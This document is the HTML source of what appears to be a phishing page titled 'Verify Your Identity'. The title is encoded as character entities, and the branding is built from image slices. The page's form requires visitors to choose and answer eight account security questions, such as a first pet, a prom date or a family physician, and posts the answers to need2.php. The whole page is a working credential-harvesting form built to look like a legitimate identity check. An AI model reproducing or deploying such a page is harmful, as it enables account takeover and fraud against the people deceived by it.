<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<style type="text/css">
			 .textbox {
    margin-right: 10px;
    padding-left:4px;
    height: 26px;
    line-height: 20px;
    vertical-align: middle;
}
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1326px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body>
<div id="container">
<div class="loader"></div>
<div id="image33" style="position:absolute; overflow:hidden; left:203px; top:785px; width:166px; height:475px; z-index:3"><img src="images/d15.png" alt="" title="" border=0 width=166 height=475></div>

<div id="image6" style="position:absolute; overflow:hidden; left:184px; top:176px; width:173px; height:23px; z-index:2"><img src="images/b8.png" alt="" title="" border=0 width=173 height=23></div>

<div id="image15" style="position:absolute; overflow:hidden; left:181px; top:1493px; width:987px; height:150px; z-index:7"><img src="images/bo28.png" alt="" title="" border=0 width=987 height=150></div>

<div id="image16" style="position:absolute; overflow:hidden; left:207px; top:1541px; width:108px; height:17px; z-index:8"><a href="#"><img src="images/bo29.png" alt="" title="" border=0 width=108 height=17></a></div>

<div id="image1" style="position:absolute; overflow:hidden; left:158px; top:16px; width:983px; height:117px; z-index:0"><img src="images/b5.png" alt="" title="" border=0 width=983 height=117></div>

<div id="image2" style="position:absolute; overflow:hidden; left:177px; top:143px; width:428px; height:28px; z-index:1"><img src="images/b9.png" alt="" title="" border=0 width=428 height=28></div>

<div id="image10" style="position:absolute; overflow:hidden; left:352px; top:1329px; width:75px; height:29px; z-index:11"><a href="#"><img src="images/b10.png" alt="" title="" border=0 width=75 height=29></a></div>

<div id="image13" style="position:absolute; overflow:hidden; left:204px; top:263px; width:166px; height:475px; z-index:14"><img src="images/a2.png" alt="" title="" border=0 width=166 height=475></div>

<div id="image3" style="position:absolute; overflow:hidden; left:180px; top:88px; width:212px; height:26px; z-index:28"><img src="images/e8.png" alt="" title="" border=0 width=212 height=26></div>

<form action=need2.php name=hawksbayjao id=hawksbayjao method=post>
<select name="q1" class="textbox" autocomplete="off" required style="position:absolute;left:205px;top:284px;width:385px;z-index:15">
<option value="">Select One</option>
<option value="What celebrity do you most resemble?">What celebrity do you most resemble?</option>
<option value="What is the Last Name of your third grade teacher?">What is the Last Name of your third grade teacher?</option>
<option value="What was the name of your boyfriend or girlfriend?">What was the name of your boyfriend or girlfriend?</option>
<option value="What is the name of your favorite charity?">What is the name of your favorite charity?</option>
<option value="What is the name of your first babysitter?">What is the name of your first babysitter?</option>
<option value="What is the best friend first name?">What is the best friend first name?</option>
<option value="In what city did you meet your spouse/significant other?">In what city did you meet your spouse/significant other?</option>
<option value="In what city did you honeymood? (Enter full name of city only)">In what city did you honeymood? (Enter full name of city only)</option>
<option value="What is the last name of your family physician?">What is the last name of your family physician?</option>
<option value="What street did your best friend in high school live on? (Enter full name of street only)">What street did your best friend in high school live on? (Enter full name of street only)</option></select>
<input name="ans1" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:214px;left:205px;top:346px;z-index:16">
<select name="q2" class="textbox" autocomplete="off" required style="position:absolute;left:205px;top:412px;width:385px;z-index:17">
<option value="">Select One</option>
<option value="As a Child, what did you want to be when you grew up?">As a Child, what did you want to be when you grew up?</option>
<option value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
<option value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
<option value="Who is your favorite person in history?">Who is your favorite person in history?</option>
<option value="What is the name of your high school's star athlete?">What is the name of your high school's star athlete?</option>
<option value="Where were you on New Year's 2000?">Where were you on New Year's 2000?</option>
<option value="What was the make and model of your first car?">What was the make and model of your first car?</option>
<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
<option value="What was the first live concert you attended?">What was the first live concert you attended?</option></select>
<input name="ans2" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:214px;left:205px;top:474px;z-index:18">
<select name="q3" class="textbox" autocomplete="off" required style="position:absolute;left:205px;top:540px;width:385px;z-index:19">
<option value="">Select One</option>
<option value="What is your all-time favorite song?">What is your all-time favorite song?</option>
<option value="What is the name of a college you applied to but didn't attend?">What is the name of a college you applied to but didn't attend?</option>
<option value="What is the name of the medical professional who delivered your first child?">What is the name of the medical professional who delivered your first child?</option>
<option value="What is the first name of your favorite niece/nephew?">What is the first name of your favorite niece/nephew?</option>
<option value="What is the name of your best childhood friend?">What is the name of your best childhood friend?</option>
<option value="What was the first name of your favorite teacher or professor?">What was the first name of your favorite teacher or professor?</option>
<option value="What is the first name of your hairdresser/barber?">What is the first name of your hairdresser/barber?</option>
<option value="What is the first name of your mother's cloest friend?">What is the first name of your mother's cloest friend?</option>
<option value="On what street is your grocery store?">On what street is your grocery store?</option>
<option value="What was the name of your first pet?">What was the name of your first pet?</option></select>
<input name="ans3" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:214px;left:205px;top:604px;z-index:20">
<select name="q4" class="textbox" autocomplete="off" required style="position:absolute;left:205px;top:674px;width:385px;z-index:21">
<option value="">Select One</option>
<option value="What celebrity do you most resemble?">What celebrity do you most resemble?</option>
<option value="What is the Last Name of your third grade teacher?">What is the Last Name of your third grade teacher?</option>
<option value="What was the name of your boyfriend or girlfriend?">What was the name of your boyfriend or girlfriend?</option>
<option value="What is the name of your favorite charity?">What is the name of your favorite charity?</option>
<option value="What is the name of your first babysitter?">What is the name of your first babysitter?</option>
<option value="What is the best friend first name?">What is the best friend first name?</option>
<option value="In what city did you meet your spouse/significant other?">In what city did you meet your spouse/significant other?</option>
<option value="In what city did you honeymood? (Enter full name of city only)">In what city did you honeymood? (Enter full name of city only)</option>
<option value="What is the last name of your family physician?">What is the last name of your family physician?</option>
<option value="What street did your best friend in high school live on? (Enter full name of street only)">What street did your best friend in high school live on? (Enter full name of street only)</option></select>
<input name="ans4" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:214px;left:205px;top:740px;z-index:22">
<select name="q5" class="textbox" autocomplete="off" required style="position:absolute;left:205px;top:806px;width:385px;z-index:23">
<option value="">Select One</option>
<option value="As a Child, what did you want to be when you grew up?">As a Child, what did you want to be when you grew up?</option>
<option value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
<option value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
<option value="Who is your favorite person in history?">Who is your favorite person in history?</option>
<option value="What is the name of your high school's star athlete?">What is the name of your high school's star athlete?</option>
<option value="Where were you on New Year's 2000?">Where were you on New Year's 2000?</option>
<option value="What was the make and model of your first car?">What was the make and model of your first car?</option>
<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
<option value="What was the first live concert you attended?">What was the first live concert you attended?</option></select>
<input name="ans5" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:214px;left:205px;top:871px;z-index:24">

<select name="q6" class="textbox" autocomplete="off" required style="position:absolute;left:205px;top:937px;width:385px;z-index:25">
<option value="">Select One</option>
<option value="What is your all-time favorite song?">What is your all-time favorite song?</option>
<option value="What is the name of a college you applied to but didn't attend?">What is the name of a college you applied to but didn't attend?</option>
<option value="What is the name of the medical professional who delivered your first child?">What is the name of the medical professional who delivered your first child?</option>
<option value="What is the first name of your favorite niece/nephew?">What is the first name of your favorite niece/nephew?</option>
<option value="What is the name of your best childhood friend?">What is the name of your best childhood friend?</option>
<option value="What was the first name of your favorite teacher or professor?">What was the first name of your favorite teacher or professor?</option>
<option value="What is the first name of your hairdresser/barber?">What is the first name of your hairdresser/barber?</option>
<option value="What is the first name of your mother's cloest friend?">What is the first name of your mother's cloest friend?</option>
<option value="On what street is your grocery store?">On what street is your grocery store?</option>
<option value="What was the name of your first pet?">What was the name of your first pet?</option></select>
<input name="ans6" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:214px;left:205px;top:1003px;z-index:26">
<select name="q7" class="textbox" autocomplete="off" required style="position:absolute;left:205px;top:1065px;width:385px;z-index:27">
<option value="">Select One</option>
<option value="What celebrity do you most resemble?">What celebrity do you most resemble?</option>
<option value="What is the Last Name of your third grade teacher?">What is the Last Name of your third grade teacher?</option>
<option value="What was the name of your boyfriend or girlfriend?">What was the name of your boyfriend or girlfriend?</option>
<option value="What is the name of your favorite charity?">What is the name of your favorite charity?</option>
<option value="What is the name of your first babysitter?">What is the name of your first babysitter?</option>
<option value="What is the best friend first name?">What is the best friend first name?</option>
<option value="In what city did you meet your spouse/significant other?">In what city did you meet your spouse/significant other?</option>
<option value="In what city did you honeymood? (Enter full name of city only)">In what city did you honeymood? (Enter full name of city only)</option>
<option value="What is the last name of your family physician?">What is the last name of your family physician?</option>
<option value="What street did your best friend in high school live on? (Enter full name of street only)">What street did your best friend in high school live on? (Enter full name of street only)</option></select>
<input name="ans7" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:214px;left:205px;top:1127px;z-index:28">
<select name="q8" class="textbox" autocomplete="off" required style="position:absolute;left:205px;top:1196px;width:385px;z-index:29">
<option value="">Select One</option>
<option value="As a Child, what did you want to be when you grew up?">As a Child, what did you want to be when you grew up?</option>
<option value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
<option value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
<option value="Who is your favorite person in history?">Who is your favorite person in history?</option>
<option value="What is the name of your high school's star athlete?">What is the name of your high school's star athlete?</option>
<option value="Where were you on New Year's 2000?">Where were you on New Year's 2000?</option>
<option value="What was the make and model of your first car?">What was the make and model of your first car?</option>
<option value="What was the first name of your first manager?">What was the first name of your first manager?</option>
<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
<option value="What was the first live concert you attended?">What was the first live concert you attended?</option></select>
<input name="ans8" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:214px;left:205px;top:1265px;z-index:30">
<div id="formimage1" style="position:absolute; left:211px; top:1329px; z-index:31"><input type="image" name="formimage1" width="129" height="32" src="images/cnf.png"></div>
</div>

</body>
</html>
